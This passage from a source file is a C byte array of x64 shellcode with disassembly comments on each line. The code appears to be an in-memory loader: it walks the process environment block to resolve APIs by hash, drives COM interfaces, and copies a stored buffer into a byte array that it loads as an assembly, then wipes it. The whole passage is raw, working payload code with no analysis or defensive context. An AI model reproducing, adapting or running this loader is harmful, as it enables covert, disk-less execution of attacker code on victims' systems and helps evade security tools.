  /* 0513 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0516 */ "\x48\x83\x63\x28\x00"                     /* and       qword ptr [rbx + 0x28], 0            */
  /* 051B */ "\x48\x8b\x4b\x20"                         /* mov       rcx, qword ptr [rbx + 0x20]          */
  /* 051F */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 0522 */ "\x74\x0b"                                 /* je        0x52f                                */
  /* 0524 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0527 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 052A */ "\x48\x83\x63\x20\x00"                     /* and       qword ptr [rbx + 0x20], 0            */
  /* 052F */ "\x48\x8b\x4b\x18"                         /* mov       rcx, qword ptr [rbx + 0x18]          */
  /* 0533 */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 0536 */ "\x74\x0b"                                 /* je        0x543                                */
  /* 0538 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 053B */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 053E */ "\x48\x83\x63\x18\x00"                     /* and       qword ptr [rbx + 0x18], 0            */
  /* 0543 */ "\x48\x8b\x4b\x10"                         /* mov       rcx, qword ptr [rbx + 0x10]          */
  /* 0547 */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 054A */ "\x74\x15"                                 /* je        0x561                                */
  /* 054C */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 054F */ "\xff\x50\x58"                             /* call      qword ptr [rax + 0x58]               */
  /* 0552 */ "\x48\x8b\x4b\x10"                         /* mov       rcx, qword ptr [rbx + 0x10]          */
  /* 0556 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0559 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 055C */ "\x48\x83\x63\x10\x00"                     /* and       qword ptr [rbx + 0x10], 0            */
  /* 0561 */ "\x48\x8b\x4b\x08"                         /* mov       rcx, qword ptr [rbx + 8]             */
  /* 0565 */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 0568 */ "\x74\x0b"                                 /* je        0x575                                */
  /* 056A */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 056D */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0570 */ "\x48\x83\x63\x08\x00"                     /* and       qword ptr [rbx + 8], 0               */
  /* 0575 */ "\x48\x8b\x0b"                             /* mov       rcx, qword ptr [rbx]                 */
  /* 0578 */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 057B */ "\x74\x0a"                                 /* je        0x587                                */
  /* 057D */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0580 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0583 */ "\x48\x83\x23\x00"                         /* and       qword ptr [rbx], 0                   */
  /* 0587 */ "\x48\x8b\x5c\x24\x30"                     /* mov       rbx, qword ptr [rsp + 0x30]          */
  /* 058C */ "\x48\x83\xc4\x20"                         /* add       rsp, 0x20                            */
  /* 0590 */ "\x5f"                                     /* pop       rdi                                  */
  /* 0591 */ "\xc3"                                     /* ret                                            */
  /* 0592 */ "\xcc"                                     /* int3                                           */
  /* 0593 */ "\xcc"                                     /* int3                                           */
  /* 0594 */ "\x48\x89\x5c\x24\x18"                     /* mov       qword ptr [rsp + 0x18], rbx          */
  /* 0599 */ "\x55"                                     /* push      rbp                                  */
  /* 059A */ "\x56"                                     /* push      rsi                                  */
  /* 059B */ "\x57"                                     /* push      rdi                                  */
  /* 059C */ "\x41\x56"                                 /* push      r14                                  */
  /* 059E */ "\x41\x57"                                 /* push      r15                                  */
  /* 05A0 */ "\x48\x83\xec\x20"                         /* sub       rsp, 0x20                            */
  /* 05A4 */ "\x83\xb9\x18\x03\x00\x00\x00"             /* cmp       dword ptr [rcx + 0x318], 0           */
  /* 05AB */ "\x4c\x8d\xb1\x00\x04\x00\x00"             /* lea       r14, qword ptr [rcx + 0x400]         */
  /* 05B2 */ "\x4c\x8b\xfa"                             /* mov       r15, rdx                             */
  /* 05B5 */ "\x48\x8b\xf1"                             /* mov       rsi, rcx                             */
  /* 05B8 */ "\x74\x03"                                 /* je        0x5bd                                */
  /* 05BA */ "\x4d\x8b\x36"                             /* mov       r14, qword ptr [r14]                 */
  /* 05BD */ "\x48\x8d\x91\xc8\x02\x00\x00"             /* lea       rdx, qword ptr [rcx + 0x2c8]         */
  /* 05C4 */ "\x4d\x8b\xc7"                             /* mov       r8, r15                              */
  /* 05C7 */ "\x48\x81\xc1\xb8\x02\x00\x00"             /* add       rcx, 0x2b8                           */
  /* 05CE */ "\xff\x96\x50\x01\x00\x00"                 /* call      qword ptr [rsi + 0x150]              */
  /* 05D4 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 05D6 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 05D8 */ "\x0f\x88\x6e\x01\x00\x00"                 /* js        0x74c                                */
  /* 05DE */ "\x49\x8b\x0f"                             /* mov       rcx, qword ptr [r15]                 */
  /* 05E1 */ "\x49\x8d\x5f\x08"                         /* lea       rbx, qword ptr [r15 + 8]             */
  /* 05E5 */ "\x4c\x8d\x86\xd8\x02\x00\x00"             /* lea       r8, qword ptr [rsi + 0x2d8]          */
  /* 05EC */ "\x4c\x8b\xcb"                             /* mov       r9, rbx                              */
  /* 05EF */ "\x49\x8d\x56\x04"                         /* lea       rdx, qword ptr [r14 + 4]             */
  /* 05F3 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 05F6 */ "\xff\x50\x18"                             /* call      qword ptr [rax + 0x18]               */
  /* 05F9 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 05FB */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 05FD */ "\x0f\x88\x49\x01\x00\x00"                 /* js        0x74c                                */
  /* 0603 */ "\x48\x8b\x0b"                             /* mov       rcx, qword ptr [rbx]                 */
  /* 0606 */ "\x48\x8d\x54\x24\x50"                     /* lea       rdx, qword ptr [rsp + 0x50]          */
  /* 060B */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 060E */ "\xff\x50\x50"                             /* call      qword ptr [rax + 0x50]               */
  /* 0611 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 0613 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0615 */ "\x0f\x88\x31\x01\x00\x00"                 /* js        0x74c                                */
  /* 061B */ "\x83\x7c\x24\x50\x00"                     /* cmp       dword ptr [rsp + 0x50], 0            */
  /* 0620 */ "\x0f\x84\x26\x01\x00\x00"                 /* je        0x74c                                */
  /* 0626 */ "\x48\x8b\x0b"                             /* mov       rcx, qword ptr [rbx]                 */
  /* 0629 */ "\x49\x8d\x6f\x10"                         /* lea       rbp, qword ptr [r15 + 0x10]          */
  /* 062D */ "\x4c\x8d\x86\xf8\x02\x00\x00"             /* lea       r8, qword ptr [rsi + 0x2f8]          */
  /* 0634 */ "\x4c\x8b\xcd"                             /* mov       r9, rbp                              */
  /* 0637 */ "\x48\x8d\x96\xe8\x02\x00\x00"             /* lea       rdx, qword ptr [rsi + 0x2e8]         */
  /* 063E */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0641 */ "\xff\x50\x48"                             /* call      qword ptr [rax + 0x48]               */
  /* 0644 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 0646 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0648 */ "\x0f\x88\xfe\x00\x00\x00"                 /* js        0x74c                                */
  /* 064E */ "\x48\x8b\x4d\x00"                         /* mov       rcx, qword ptr [rbp]                 */
  /* 0652 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0655 */ "\xff\x50\x50"                             /* call      qword ptr [rax + 0x50]               */
  /* 0658 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 065A */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 065C */ "\x0f\x88\xea\x00\x00\x00"                 /* js        0x74c                                */
  /* 0662 */ "\x49\x8d\x4e\x44"                         /* lea       rcx, qword ptr [r14 + 0x44]          */
  /* 0666 */ "\xff\x96\x78\x01\x00\x00"                 /* call      qword ptr [rsi + 0x178]              */
  /* 066C */ "\x48\x8b\x4d\x00"                         /* mov       rcx, qword ptr [rbp]                 */
  /* 0670 */ "\x4d\x8d\x4f\x18"                         /* lea       r9, qword ptr [r15 + 0x18]           */
  /* 0674 */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 0677 */ "\x48\x8b\xd0"                             /* mov       rdx, rax                             */
  /* 067A */ "\x48\x8b\xd8"                             /* mov       rbx, rax                             */
  /* 067D */ "\x4c\x8b\x11"                             /* mov       r10, qword ptr [rcx]                 */
  /* 0680 */ "\x41\xff\x52\x60"                         /* call      qword ptr [r10 + 0x60]               */
  /* 0684 */ "\x48\x8b\xcb"                             /* mov       rcx, rbx                             */
  /* 0687 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 0689 */ "\xff\x96\x80\x01\x00\x00"                 /* call      qword ptr [rsi + 0x180]              */
  /* 068F */ "\x85\xff"                                 /* test      edi, edi                             */
  /* 0691 */ "\x0f\x88\xb5\x00\x00\x00"                 /* js        0x74c                                */
  /* 0697 */ "\x49\x8b\x4f\x18"                         /* mov       rcx, qword ptr [r15 + 0x18]          */
  /* 069B */ "\x48\x8d\x96\x08\x03\x00\x00"             /* lea       rdx, qword ptr [rsi + 0x308]         */
  /* 06A2 */ "\x4d\x8d\x47\x20"                         /* lea       r8, qword ptr [r15 + 0x20]           */
  /* 06A6 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 06A9 */ "\xff\x10"                                 /* call      qword ptr [rax]                      */
  /* 06AB */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 06AD */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 06AF */ "\x0f\x88\x97\x00\x00\x00"                 /* js        0x74c                                */
  /* 06B5 */ "\x83\x64\x24\x5c\x00"                     /* and       dword ptr [rsp + 0x5c], 0            */
  /* 06BA */ "\x4c\x8d\x44\x24\x58"                     /* lea       r8, qword ptr [rsp + 0x58]           */
  /* 06BF */ "\x41\x8b\x86\x30\x03\x00\x00"             /* mov       eax, dword ptr [r14 + 0x330]         */
  /* 06C6 */ "\xb9\x11\x00\x00\x00"                     /* mov       ecx, 0x11                            */
  /* 06CB */ "\x89\x44\x24\x58"                         /* mov       dword ptr [rsp + 0x58], eax          */
  /* 06CF */ "\x8d\x51\xf0"                             /* lea       edx, dword ptr [rcx - 0x10]          */
  /* 06D2 */ "\xff\x96\x58\x01\x00\x00"                 /* call      qword ptr [rsi + 0x158]              */
  /* 06D8 */ "\x48\x8b\xd8"                             /* mov       rbx, rax                             */
  /* 06DB */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 06DE */ "\x74\x6c"                                 /* je        0x74c                                */
  /* 06E0 */ "\x4c\x8b\x40\x10"                         /* mov       r8, qword ptr [rax + 0x10]           */
  /* 06E4 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 06E6 */ "\x41\x39\x96\x30\x03\x00\x00"             /* cmp       dword ptr [r14 + 0x330], edx         */
  /* 06ED */ "\x76\x17"                                 /* jbe       0x706                                */
  /* 06EF */ "\x41\x8a\x84\x16\x34\x03\x00\x00"         /* mov       al, byte ptr [r14 + rdx + 0x334]     */
  /* 06F7 */ "\x42\x88\x04\x02"                         /* mov       byte ptr [rdx + r8], al              */
  /* 06FB */ "\xff\xc2"                                 /* inc       edx                                  */
  /* 06FD */ "\x41\x3b\x96\x30\x03\x00\x00"             /* cmp       edx, dword ptr [r14 + 0x330]         */
  /* 0704 */ "\x72\xe9"                                 /* jb        0x6ef                                */
  /* 0706 */ "\x49\x8b\x4f\x20"                         /* mov       rcx, qword ptr [r15 + 0x20]          */
  /* 070A */ "\x4d\x8d\x47\x28"                         /* lea       r8, qword ptr [r15 + 0x28]           */
  /* 070E */ "\x48\x8b\xd3"                             /* mov       rdx, rbx                             */
  /* 0711 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0714 */ "\xff\x90\x68\x01\x00\x00"                 /* call      qword ptr [rax + 0x168]              */
  /* 071A */ "\x48\x8b\x53\x10"                         /* mov       rdx, qword ptr [rbx + 0x10]          */
  /* 071E */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 0720 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 0722 */ "\x41\x39\x8e\x30\x03\x00\x00"             /* cmp       dword ptr [r14 + 0x330], ecx         */
  /* 0729 */ "\x76\x18"                                 /* jbe       0x743                                */
  /* 072B */ "\x41\xc6\x84\x0e\x34\x03\x00\x00\x00"     /* mov       byte ptr [r14 + rcx + 0x334], 0      */
  /* 0734 */ "\xc6\x04\x11\x00"                         /* mov       byte ptr [rcx + rdx], 0              */
  /* 0738 */ "\xff\xc1"                                 /* inc       ecx                                  */
  /* 073A */ "\x41\x3b\x8e\x30\x03\x00\x00"             /* cmp       ecx, dword ptr [r14 + 0x330]         */
  /* 0741 */ "\x72\xe8"                                 /* jb        0x72b                                */
  /* 0743 */ "\x48\x8b\xcb"                             /* mov       rcx, rbx                             */
  /* 0746 */ "\xff\x96\x70\x01\x00\x00"                 /* call      qword ptr [rsi + 0x170]              */
  /* 074C */ "\x48\x8b\x5c\x24\x60"                     /* mov       rbx, qword ptr [rsp + 0x60]          */
  /* 0751 */ "\xf7\xd7"                                 /* not       edi                                  */
  /* 0753 */ "\xc1\xef\x1f"                             /* shr       edi, 0x1f                            */
  /* 0756 */ "\x8b\xc7"                                 /* mov       eax, edi                             */
  /* 0758 */ "\x48\x83\xc4\x20"                         /* add       rsp, 0x20                            */
  /* 075C */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 075E */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 0760 */ "\x5f"                                     /* pop       rdi                                  */
  /* 0761 */ "\x5e"                                     /* pop       rsi                                  */
  /* 0762 */ "\x5d"                                     /* pop       rbp                                  */
  /* 0763 */ "\xc3"                                     /* ret                                            */
  /* 0764 */ "\x48\x8b\xc4"                             /* mov       rax, rsp                             */
  /* 0767 */ "\x48\x89\x58\x10"                         /* mov       qword ptr [rax + 0x10], rbx          */
  /* 076B */ "\x48\x89\x70\x18"                         /* mov       qword ptr [rax + 0x18], rsi          */
  /* 076F */ "\x48\x89\x78\x20"                         /* mov       qword ptr [rax + 0x20], rdi          */
  /* 0773 */ "\x55"                                     /* push      rbp                                  */
  /* 0774 */ "\x41\x54"                                 /* push      r12                                  */
  /* 0776 */ "\x41\x55"                                 /* push      r13                                  */
  /* 0778 */ "\x41\x56"                                 /* push      r14                                  */
  /* 077A */ "\x41\x57"                                 /* push      r15                                  */
  /* 077C */ "\x48\x8d\x68\xa1"                         /* lea       rbp, qword ptr [rax - 0x5f]          */
  /* 0780 */ "\x48\x81\xec\xb0\x00\x00\x00"             /* sub       rsp, 0xb0                            */
  /* 0787 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 0789 */ "\x48\x8d\xb9\x00\x04\x00\x00"             /* lea       rdi, qword ptr [rcx + 0x400]         */
  /* 0790 */ "\x48\x8b\xf2"                             /* mov       rsi, rdx                             */
  /* 0793 */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 0796 */ "\x48\x89\x45\xc7"                         /* mov       qword ptr [rbp - 0x39], rax          */
  /* 079A */ "\x48\x89\x45\xcf"                         /* mov       qword ptr [rbp - 0x31], rax          */
  /* 079E */ "\x48\x89\x45\xd7"                         /* mov       qword ptr [rbp - 0x29], rax          */
  /* 07A2 */ "\x39\x81\x18\x03\x00\x00"                 /* cmp       dword ptr [rcx + 0x318], eax         */
  /* 07A8 */ "\x74\x03"                                 /* je        0x7ad                                */
  /* 07AA */ "\x48\x8b\x3f"                             /* mov       rdi, qword ptr [rdi]                 */
  /* 07AD */ "\x48\x8d\x8f\x84\x00\x00\x00"             /* lea       rcx, qword ptr [rdi + 0x84]          */
  /* 07B4 */ "\xff\x93\x78\x01\x00\x00"                 /* call      qword ptr [rbx + 0x178]              */
  /* 07BA */ "\x4c\x8b\xf0"                             /* mov       r14, rax                             */
  /* 07BD */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 07C0 */ "\x0f\x84\x2f\x01\x00\x00"                 /* je        0x8f5                                */
  /* 07C6 */ "\x48\x8d\x8f\xc4\x00\x00\x00"             /* lea       rcx, qword ptr [rdi + 0xc4]          */
  /* 07CD */ "\xff\x93\x78\x01\x00\x00"                 /* call      qword ptr [rbx + 0x178]              */
  /* 07D3 */ "\x4c\x8b\xf8"                             /* mov       r15, rax                             */
  /* 07D6 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 07D9 */ "\x0f\x84\xff\x00\x00\x00"                 /* je        0x8de                                */
  /* 07DF */ "\x48\x8b\x4e\x28"                         /* mov       rcx, qword ptr [rsi + 0x28]          */
  /* 07E3 */ "\x4c\x8d\x6e\x30"                         /* lea       r13, qword ptr [rsi + 0x30]          */
  /* 07E7 */ "\x4d\x8b\xc5"                             /* mov       r8, r13                              */
  /* 07EA */ "\x49\x8b\xd6"                             /* mov       rdx, r14                             */
  /* 07ED */ "\x4c\x8b\x09"                             /* mov       r9, qword ptr [rcx]                  */
  /* 07F0 */ "\x41\xff\x91\x88\x00\x00\x00"             /* call      qword ptr [r9 + 0x88]                */
  /* 07F7 */ "\x44\x8b\xe0"                             /* mov       r12d, eax                            */
  /* 07FA */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 07FC */ "\x0f\x88\xdc\x00\x00\x00"                 /* js        0x8de                                */
  /* 0802 */ "\x44\x8b\x87\x04\x01\x00\x00"             /* mov       r8d, dword ptr [rdi + 0x104]         */
  /* 0809 */ "\x33\xf6"                                 /* xor       esi, esi                             */
  /* 080B */ "\x45\x85\xc0"                             /* test      r8d, r8d                             */
  /* 080E */ "\x74\x78"                                 /* je        0x888                                */
  /* 0810 */ "\x8d\x4e\x0c"                             /* lea       ecx, dword ptr [rsi + 0xc]           */
  /* 0813 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0815 */ "\xff\x93\x60\x01\x00\x00"                 /* call      qword ptr [rbx + 0x160]              */
  /* 081B */ "\x48\x8b\xf0"                             /* mov       rsi, rax                             */
  /* 081E */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0821 */ "\x74\x65"                                 /* je        0x888                                */
  /* 0823 */ "\x83\x65\x67\x00"                         /* and       dword ptr [rbp + 0x67], 0            */
  /* 0827 */ "\x83\xbf\x04\x01\x00\x00\x00"             /* cmp       dword ptr [rdi + 0x104], 0           */
  /* 082E */ "\x76\x58"                                 /* jbe       0x888                                */
  /* 0830 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 0832 */ "\x8b\xc8"                                 /* mov       ecx, eax                             */
  /* 0834 */ "\x48\xc1\xe1\x06"                         /* shl       rcx, 6                               */
  /* 0838 */ "\x48\x81\xc1\x08\x01\x00\x00"             /* add       rcx, 0x108                           */
  /* 083F */ "\x48\x03\xcf"                             /* add       rcx, rdi                             */
  /* 0842 */ "\xff\x93\x78\x01\x00\x00"                 /* call      qword ptr [rbx + 0x178]              */
  /* 0848 */ "\x48\x89\x45\xe7"                         /* mov       qword ptr [rbp - 0x19], rax          */
  /* 084C */ "\x4c\x8d\x45\xdf"                         /* lea       r8, qword ptr [rbp - 0x21]           */
  /* 0850 */ "\x48\x8d\x55\x67"                         /* lea       rdx, qword ptr [rbp + 0x67]          */
  /* 0854 */ "\x48\x8b\xce"                             /* mov       rcx, rsi                             */
  /* 0857 */ "\xb8\x08\x00\x00\x00"                     /* mov       eax, 8                               */
  /* 085C */ "\x66\x89\x45\xdf"                         /* mov       word ptr [rbp - 0x21], ax            */
  /* 0860 */ "\xff\x93\x68\x01\x00\x00"                 /* call      qword ptr [rbx + 0x168]              */
  /* 0866 */ "\x44\x8b\xe0"                             /* mov       r12d, eax                            */
  /* 0869 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 086B */ "\x79\x0b"                                 /* jns       0x878                                */
  /* 086D */ "\x48\x8b\xce"                             /* mov       rcx, rsi                             */
  /* 0870 */ "\xff\x93\x70\x01\x00\x00"                 /* call      qword ptr [rbx + 0x170]              */
  /* 0876 */ "\x33\xf6"                                 /* xor       esi, esi                             */
  /* 0878 */ "\x8b\x45\x67"                             /* mov       eax, dword ptr [rbp + 0x67]          */
  /* 087B */ "\xff\xc0"                                 /* inc       eax                                  */
  /* 087D */ "\x89\x45\x67"                             /* mov       dword ptr [rbp + 0x67], eax          */
  /* 0880 */ "\x3b\x87\x04\x01\x00\x00"                 /* cmp       eax, dword ptr [rdi + 0x104]         */
  /* 0886 */ "\x72\xaa"                                 /* jb        0x832                                */
  /* 0888 */ "\x45\x85\xe4"                             /* test      r12d, r12d                           */
  /* 088B */ "\x78\x51"                                 /* js        0x8de                                */
  /* 088D */ "\x49\x8b\x4d\x00"                         /* mov       rcx, qword ptr [r13]                 */
  /* 0891 */ "\x48\x8d\x45\x17"                         /* lea       rax, qword ptr [rbp + 0x17]          */
  /* 0895 */ "\x0f\x10\x45\xc7"                         /* movups    xmm0, xmmword ptr [rbp - 0x39]       */
  /* 0899 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 089C */ "\x48\x89\x44\x24\x30"                     /* mov       qword ptr [rsp + 0x30], rax          */
  /* 08A1 */ "\xf2\x0f\x10\x4d\xd7"                     /* movsd     xmm1, qword ptr [rbp - 0x29]         */
  /* 08A6 */ "\x48\x8d\x45\xf7"                         /* lea       rax, qword ptr [rbp - 9]             */
  /* 08AA */ "\x4c\x8b\x11"                             /* mov       r10, qword ptr [rcx]                 */
  /* 08AD */ "\x41\xb8\x18\x01\x00\x00"                 /* mov       r8d, 0x118                           */
  /* 08B3 */ "\x48\x89\x74\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rsi          */
  /* 08B8 */ "\x49\x8b\xd7"                             /* mov       rdx, r15                             */
  /* 08BB */ "\x0f\x29\x45\xf7"                         /* movaps    xmmword ptr [rbp - 9], xmm0          */
  /* 08BF */ "\xf2\x0f\x11\x4d\x07"                     /* movsd     qword ptr [rbp + 7], xmm1            */
  /* 08C4 */ "\x48\x89\x44\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rax          */
  /* 08C9 */ "\x41\xff\x92\xc8\x01\x00\x00"             /* call      qword ptr [r10 + 0x1c8]              */
  /* 08D0 */ "\x48\x85\xf6"                             /* test      rsi, rsi                             */
  /* 08D3 */ "\x74\x09"                                 /* je        0x8de                                */
  /* 08D5 */ "\x48\x8b\xce"                             /* mov       rcx, rsi                             */
  /* 08D8 */ "\xff\x93\x70\x01\x00\x00"                 /* call      qword ptr [rbx + 0x170]              */
  /* 08DE */ "\x49\x8b\xcf"                             /* mov       rcx, r15                             */
  /* 08E1 */ "\xff\x93\x80\x01\x00\x00"                 /* call      qword ptr [rbx + 0x180]              */
  /* 08E7 */ "\x49\x8b\xce"                             /* mov       rcx, r14                             */
  /* 08EA */ "\xff\x93\x80\x01\x00\x00"                 /* call      qword ptr [rbx + 0x180]              */
  /* 08F0 */ "\xb8\x01\x00\x00\x00"                     /* mov       eax, 1                               */
  /* 08F5 */ "\x4c\x8d\x9c\x24\xb0\x00\x00\x00"         /* lea       r11, qword ptr [rsp + 0xb0]          */
  /* 08FD */ "\x49\x8b\x5b\x38"                         /* mov       rbx, qword ptr [r11 + 0x38]          */
  /* 0901 */ "\x49\x8b\x73\x40"                         /* mov       rsi, qword ptr [r11 + 0x40]          */
  /* 0905 */ "\x49\x8b\x7b\x48"                         /* mov       rdi, qword ptr [r11 + 0x48]          */
  /* 0909 */ "\x49\x8b\xe3"                             /* mov       rsp, r11                             */
  /* 090C */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 090E */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 0910 */ "\x41\x5d"                                 /* pop       r13                                  */
  /* 0912 */ "\x41\x5c"                                 /* pop       r12                                  */
  /* 0914 */ "\x5d"                                     /* pop       rbp                                  */
  /* 0915 */ "\xc3"                                     /* ret                                            */
  /* 0916 */ "\xcc"                                     /* int3                                           */
  /* 0917 */ "\xcc"                                     /* int3                                           */
  /* 0918 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 091D */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
  /* 0922 */ "\x57"                                     /* push      rdi                                  */
  /* 0923 */ "\x48\x83\xec\x20"                         /* sub       rsp, 0x20                            */
  /* 0927 */ "\x65\x48\x8b\x04\x25\x60\x00\x00\x00"     /* mov       rax, qword ptr gs:[0x60]             */
  /* 0930 */ "\x48\x8b\xfa"                             /* mov       rdi, rdx                             */
  /* 0933 */ "\x48\x8b\xf1"                             /* mov       rsi, rcx                             */
  /* 0936 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 0939 */ "\x4c\x8b\x40\x18"                         /* mov       r8, qword ptr [rax + 0x18]           */
  /* 093D */ "\x49\x8b\x58\x10"                         /* mov       rbx, qword ptr [r8 + 0x10]           */
  /* 0941 */ "\xeb\x19"                                 /* jmp       0x95c                                */
  /* 0943 */ "\x4d\x85\xc9"                             /* test      r9, r9                               */
  /* 0946 */ "\x75\x1d"                                 /* jne       0x965                                */
  /* 0948 */ "\x4c\x8b\xc7"                             /* mov       r8, rdi                              */
  /* 094B */ "\x48\x8b\xd6"                             /* mov       rdx, rsi                             */
  /* 094E */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 0951 */ "\xe8\x7e\xfa\xff\xff"                     /* call      0x3d4                                */
  /* 0956 */ "\x48\x8b\x1b"                             /* mov       rbx, qword ptr [rbx]                 */
  /* 0959 */ "\x4c\x8b\xc8"                             /* mov       r9, rax                              */
  /* 095C */ "\x48\x8b\x43\x30"                         /* mov       rax, qword ptr [rbx + 0x30]          */
  /* 0960 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0963 */ "\x75\xde"                                 /* jne       0x943                                */
  /* 0965 */ "\x48\x8b\x5c\x24\x30"                     /* mov       rbx, qword ptr [rsp + 0x30]          */
  /* 096A */ "\x49\x8b\xc1"                             /* mov       rax, r9                              */
  /* 096D */ "\x48\x8b\x74\x24\x38"                     /* mov       rsi, qword ptr [rsp + 0x38]          */
  /* 0972 */ "\x48\x83\xc4\x20"                         /* add       rsp, 0x20                            */
  /* 0976 */ "\x5f"                                     /* pop       rdi                                  */
  /* 0977 */ "\xc3"                                     /* ret                                            */
  /* 0978 */ "\x48\x8b\xc4"                             /* mov       rax, rsp                             */
  /* 097B */ "\x48\x89\x58\x08"                         /* mov       qword ptr [rax + 8], rbx             */
  /* 097F */ "\x48\x89\x68\x10"                         /* mov       qword ptr [rax + 0x10], rbp          */
  /* 0983 */ "\x48\x89\x70\x18"                         /* mov       qword ptr [rax + 0x18], rsi          */
  /* 0987 */ "\x48\x89\x78\x20"                         /* mov       qword ptr [rax + 0x20], rdi          */
  /* 098B */ "\x41\x56"                                 /* push      r14                                  */
  /* 098D */ "\x48\x83\xec\x30"                         /* sub       rsp, 0x30                            */
  /* 0991 */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 0994 */ "\x33\xf6"                                 /* xor       esi, esi                             */
  /* 0996 */ "\x33\xed"                                 /* xor       ebp, ebp                             */
  /* 0998 */ "\x48\x8b\xda"                             /* mov       rbx, rdx                             */
  /* 099B */ "\x4c\x8b\xf1"                             /* mov       r14, rcx                             */
  /* 099E */ "\x42\x8a\x14\x36"                         /* mov       dl, byte ptr [rsi + r14]             */
  /* 09A2 */ "\x84\xd2"                                 /* test      dl, dl                               */
  /* 09A4 */ "\x74\x13"                                 /* je        0x9b9                                */
  /* 09A6 */ "\x83\xfe\x40"                             /* cmp       esi, 0x40                            */
  /* 09A9 */ "\x74\x0e"                                 /* je        0x9b9                                */
  /* 09AB */ "\x41\x8b\xc0"                             /* mov       eax, r8d                             */
  /* 09AE */ "\x41\xff\xc0"                             /* inc       r8d                                  */
  /* 09B1 */ "\xff\xc6"                                 /* inc       esi                                  */
  /* 09B3 */ "\x88\x54\x04\x20"                         /* mov       byte ptr [rsp + rax + 0x20], dl      */
  /* 09B7 */ "\xeb\x50"                                 /* jmp       0xa09                                */
  /* 09B9 */ "\x41\x8b\xc0"                             /* mov       eax, r8d                             */
  /* 09BC */ "\x48\x8d\x54\x24\x20"                     /* lea       rdx, qword ptr [rsp + 0x20]          */
  /* 09C1 */ "\x48\x03\xd0"                             /* add       rdx, rax                             */
  /* 09C4 */ "\xb9\x10\x00\x00\x00"                     /* mov       ecx, 0x10                            */
  /* 09C9 */ "\x41\x2b\xc8"                             /* sub       ecx, r8d                             */
  /* 09CC */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 09CE */ "\x48\x8b\xfa"                             /* mov       rdi, rdx                             */
  /* 09D1 */ "\xf3\xaa"                                 /* rep stosb byte ptr [rdi], al                   */
  /* 09D3 */ "\xc6\x02\x80"                             /* mov       byte ptr [rdx], 0x80                 */
  /* 09D6 */ "\x41\x83\xf8\x0c"                         /* cmp       r8d, 0xc                             */
  /* 09DA */ "\x72\x1c"                                 /* jb        0x9f8                                */
  /* 09DC */ "\x48\x8b\xd3"                             /* mov       rdx, rbx                             */
